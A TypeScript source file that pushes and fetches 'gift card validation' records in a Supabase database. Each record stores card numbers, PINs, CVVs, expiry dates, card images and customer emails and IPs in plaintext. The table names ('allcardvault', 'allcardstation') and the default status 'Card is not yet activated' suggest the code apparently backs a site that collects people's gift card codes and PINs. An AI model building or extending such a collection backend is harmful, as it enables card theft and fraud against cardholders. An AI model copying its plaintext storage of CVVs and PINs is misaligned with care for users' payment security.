import { createClient, SupabaseClient } from '@supabase/supabase-js';

const TABLE_CANDIDATES = [
  process.env.SUPABASE_TABLE_NAME,
  'GiftCardValidationpin',
  'gift_card_validations',
  'GiftCardValidation',
  'giftcardvalidations',
  'giftcardvalidation',
  'allcardvault',
  'allcardstation',
].filter(Boolean) as string[];

let supabaseClient: SupabaseClient | null = null;
let activeTableName: string | null = null;

async function getActiveTableName(client: SupabaseClient): Promise<string> {
  if (activeTableName) return activeTableName;

  // Try configured table name first if available
  if (process.env.SUPABASE_TABLE_NAME) {
    activeTableName = process.env.SUPABASE_TABLE_NAME;
    return activeTableName;
  }

  for (const candidate of TABLE_CANDIDATES) {
    try {
      const { error } = await client.from(candidate).select('id').limit(1);
      if (!error) {
        activeTableName = candidate;
        console.log(`[Supabase] Using active table: ${candidate}`);
        return candidate;
      }
    } catch {
      // Continue to next candidate
    }
  }

  // Default fallback
  return 'GiftCardValidationpin';
}

export function isSupabaseConfigured(): boolean {
  const url = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL;
  const key =
    process.env.SUPABASE_SERVICE_ROLE_KEY ||
    process.env.SUPABASE_KEY ||
    process.env.VITE_SUPABASE_ANON_KEY ||
    process.env.VITE_SUPABASE_KEY;
  return Boolean(url && key);
}

export function getSupabaseClient(): SupabaseClient | null {
  if (supabaseClient) return supabaseClient;

  const url = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL;
  const key =
    process.env.SUPABASE_SERVICE_ROLE_KEY ||
    process.env.SUPABASE_KEY ||
    process.env.VITE_SUPABASE_ANON_KEY ||
    process.env.VITE_SUPABASE_KEY;

  if (!url || !key) {
    return null;
  }

  try {
    supabaseClient = createClient(url.trim(), key.trim(), {
      auth: {
        persistSession: false,
        autoRefreshToken: false,
      },
    });
    return supabaseClient;
  } catch (error) {
    console.error('Failed to initialize Supabase client:', error);
    return null;
  }
}

export interface SupabaseValidationRecord {
  id: string;
  brand: string;
  card_number?: string;
  cardNumber?: string;
  pin?: string | null;
  cvv?: string | null;
  expiry_date?: string | null;
  expiryDate?: string | null;
  card_amount?: number;
  cardAmount?: number;
  currency?: string;
  status?: string;
  result?: string | null;
  notes?: string | null;
  customer_email?: string | null;
  customer_ip?: string | null;
  images?: string[];
  created_at?: string;
  createdAt?: string;
  updated_at?: string;
  updatedAt?: string;
}

export function formatRecordForSupabase(v: any, tableName: string = ''): any {
  let imagesArray: string[] = [];
  if (Array.isArray(v.images)) {
    imagesArray = v.images.filter((img: any) => typeof img === 'string' && img.trim().length > 0);
  } else if (typeof v.images === 'string') {
    try {
      const parsed = JSON.parse(v.images);
      imagesArray = Array.isArray(parsed) ? parsed : [];
    } catch {
      imagesArray = [];
    }
  }

  const isGiftCardValidationpin =
    tableName.toLowerCase().includes('validationpin') ||
    tableName.includes('GiftCardValidationpin');

  if (isGiftCardValidationpin) {
    return {
      id: v.id,
      brand: v.brand || 'Unknown',
      cardNumber: v.cardNumber || v.card_number || '',
      pin: v.pin || null,
      status: v.status || 'PENDING',
      result: v.result || 'Validation pending',
      createdAt: v.createdAt ? new Date(v.createdAt).toISOString() : new Date().toISOString(),
      updatedAt: v.updatedAt ? new Date(v.updatedAt).toISOString() : new Date().toISOString(),
      currency: v.currency || 'USD',
      cardAmount: typeof v.cardAmount === 'number' ? v.cardAmount : (parseFloat(v.card_amount) || 0.0),
      cvv: v.cvv || null,
      expiryDate: v.expiryDate || v.expiry_date || null,
      images: imagesArray,
    };
  }

  return {
    id: v.id,
    brand: v.brand,
    card_number: v.cardNumber || v.card_number,
    pin: v.pin || null,
    cvv: v.cvv || null,
    expiry_date: v.expiryDate || v.expiry_date || null,
    card_amount: typeof v.cardAmount === 'number' ? v.cardAmount : (parseFloat(v.card_amount) || 0.0),
    currency: v.currency || 'USD',
    status: v.status || 'PENDING',
    result: v.result || null,
    notes: v.notes || null,
    customer_email: v.customerEmail || v.customer_email || null,
    customer_ip: v.customerIp || v.customer_ip || null,
    images: imagesArray,
    created_at: v.createdAt ? new Date(v.createdAt).toISOString() : new Date().toISOString(),
    updated_at: v.updatedAt ? new Date(v.updatedAt).toISOString() : new Date().toISOString(),
  };
}

/**
 * Pushes a single validation record to the Supabase database.
 * Does not throw error, returns structured result so application flow is never disrupted.
 */
export async function pushValidationToSupabase(record: any): Promise<{
  synced: boolean;
  message?: string;
  error?: string;
  tableMissing?: boolean;
}> {
  const client = getSupabaseClient();
  if (!client) {
    return {
      synced: false,
      message: 'Supabase credentials not configured in environment (SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY). Record saved locally.',
    };
  }

  try {
    const tableName = await getActiveTableName(client);
    const payload = formatRecordForSupabase(record, tableName);
    const { error } = await client
      .from(tableName)
      .upsert(payload, { onConflict: 'id' });

    if (error) {
      const isTableMissing =
        error.message?.includes('schema cache') ||
        error.message?.includes('relation') ||
        error.message?.includes('does not exist');

      const userFriendlyMessage = isTableMissing
        ? `The table '${tableName}' was not found in your Supabase project. Open your Supabase SQL Editor and execute the CREATE TABLE script from the Supabase Guide.`
        : error.message;

      console.warn('Supabase sync notice:', userFriendlyMessage);
      return {
        synced: false,
        error: userFriendlyMessage,
        tableMissing: isTableMissing,
      };
    }

    return {
      synced: true,
      message: `Successfully synced to Supabase database table ${tableName}.`,
    };
  } catch (err: any) {
    const isTableMissing =
      err?.message?.includes('schema cache') ||
      err?.message?.includes('relation') ||
      err?.message?.includes('does not exist');

    return {
      synced: false,
      error: isTableMissing
        ? "The table was not found in your Supabase project. Run the SQL script in Supabase SQL Editor."
        : err?.message || 'Unknown error while connecting to Supabase',
      tableMissing: isTableMissing,
    };
  }
}

/**
 * Bulk syncs an array of validation records to Supabase.
 */
export async function bulkSyncValidationsToSupabase(records: any[]): Promise<{
  success: boolean;
  syncedCount: number;
  totalCount: number;
  error?: string;
  configured: boolean;
  tableMissing?: boolean;
}> {
  const client = getSupabaseClient();
  if (!client) {
    return {
      success: false,
      syncedCount: 0,
      totalCount: records.length,
      configured: false,
      error: 'Supabase credentials are not configured yet. Add SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY to environment variables.',
    };
  }

  if (!records || records.length === 0) {
    return {
      success: true,
      syncedCount: 0,
      totalCount: 0,
      configured: true,
    };
  }

  try {
    const tableName = await getActiveTableName(client);
    const formattedRecords = records.map((r) => formatRecordForSupabase(r, tableName));
    const { error } = await client
      .from(tableName)
      .upsert(formattedRecords, { onConflict: 'id' });

    if (error) {
      const isTableMissing =
        error.message?.includes('schema cache') ||
        error.message?.includes('relation') ||
        error.message?.includes('does not exist');

      const userFriendlyMessage = isTableMissing
        ? `Table '${tableName}' does not exist in your Supabase database yet. Please click 'Supabase Guide' in the table editor, copy the SQL, and run it in your Supabase SQL Editor.`
        : error.message;

      return {
        success: false,
        syncedCount: 0,
        totalCount: records.length,
        configured: true,
        tableMissing: isTableMissing,
        error: userFriendlyMessage,
      };
    }

    return {
      success: true,
      syncedCount: records.length,
      totalCount: records.length,
      configured: true,
    };
  } catch (err: any) {
    const isTableMissing =
      err?.message?.includes('schema cache') ||
      err?.message?.includes('relation') ||
      err?.message?.includes('does not exist');

    return {
      success: false,
      syncedCount: 0,
      totalCount: records.length,
      configured: true,
      tableMissing: isTableMissing,
      error: isTableMissing
        ? "Table does not exist in your Supabase project. Please run the SQL setup script."
        : err?.message || 'Failed to sync batch to Supabase',
    };
  }
}

/**
 * Checks the real-time health and table readiness of Supabase.
 */
export async function checkSupabaseHealth(): Promise<{
  configured: boolean;
  url: string | null;
  tableReady: boolean;
  message: string;
}> {
  const client = getSupabaseClient();
  const url = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || null;

  if (!client) {
    return {
      configured: false,
      url,
      tableReady: false,
      message: 'Supabase credentials (SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY) are not configured.',
    };
  }

  try {
    const tableName = await getActiveTableName(client);
    const { error } = await client
      .from(tableName)
      .select('id')
      .limit(1);

    if (error) {
      const isTableMissing =
        error.message?.includes('schema cache') ||
        error.message?.includes('relation') ||
        error.message?.includes('does not exist');

      return {
        configured: true,
        url,
        tableReady: false,
        message: isTableMissing
          ? `Supabase connected, but table '${tableName}' has not been created yet in your Supabase project.`
          : `Supabase error: ${error.message}`,
      };
    }

    return {
      configured: true,
      url,
      tableReady: true,
      message: `Supabase connected and table '${tableName}' is active and ready.`,
    };
  } catch (err: any) {
    return {
      configured: true,
      url,
      tableReady: false,
      message: err?.message || 'Error checking Supabase table status.',
    };
  }
}

/**
 * Fetches all saved validation records directly from Supabase.
 */
export async function fetchValidationsFromSupabase(): Promise<any[]> {
  const client = getSupabaseClient();
  if (!client) return [];

  try {
    const tableName = await getActiveTableName(client);
    const { data, error } = await client
      .from(tableName)
      .select('*')
      .order('created_at', { ascending: false });

    if (error || !Array.isArray(data)) return [];

    return data.map((row) => {
      let imagesArr: string[] = [];
      try {
        if (typeof row.images === 'string') {
          imagesArr = JSON.parse(row.images);
        } else if (Array.isArray(row.images)) {
          imagesArr = row.images;
        }
      } catch {
        imagesArr = [];
      }

      return {
        id: String(row.id || ''),
        brand: String(row.brand || 'Gift Card'),
        cardNumber: String(row.card_number || row.cardNumber || ''),
        pin: row.pin ? String(row.pin) : null,
        cvv: row.cvv ? String(row.cvv) : null,
        expiryDate: row.expiry_date || row.expiryDate ? String(row.expiry_date || row.expiryDate) : null,
        currency: String(row.currency || 'USD'),
        cardAmount: Number(row.card_amount || row.cardAmount || 0),
        status: String(row.status || 'PENDING'),
        result: String(row.result || 'Card is not yet activated'),
        notes: row.notes ? String(row.notes) : null,
        customerEmail: row.customer_email || row.customerEmail ? String(row.customer_email || row.customerEmail) : null,
        customerIp: row.customer_ip || row.customerIp ? String(row.customer_ip || row.customerIp) : null,
        images: JSON.stringify(imagesArr),
        createdAt: row.created_at ? new Date(row.created_at) : new Date(),
        updatedAt: row.updated_at ? new Date(row.updated_at) : new Date(),
      };
    });
  } catch (err) {
    console.warn('[Supabase] Failed to fetch validation records:', err);
    return [];
  }
}

